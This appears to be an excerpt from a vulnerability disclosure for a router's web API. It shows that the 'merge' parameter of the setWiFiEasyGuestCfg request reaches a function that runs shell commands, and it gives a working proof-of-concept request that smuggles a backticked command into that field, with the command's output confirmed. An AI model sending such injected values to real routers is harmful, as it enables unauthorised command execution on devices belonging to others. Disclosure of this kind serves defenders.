...
In sub_421D08 function, it reads in a user-provided parameter `merge` and passes its value to Uci_Set_Str function,which is defined in libcscommon.so.
...
We set `merge` as **\`ls>./setWiFiEasyGuestCfg.txt\`** , and the router will execute it,such as:
...
{"topicurl":"setWiFiEasyGuestCfg","merge":"`ls>./setWiFiEasyGuestCfg.txt`"
}
```

## Result

After submitting the HTTP request, we observed that the txt file was successfully created, and its content was precisely the list of filenames from the folder. This confirms that the command `ls>./setWiFiEasyGuestCfg.txt` was executed successfully.
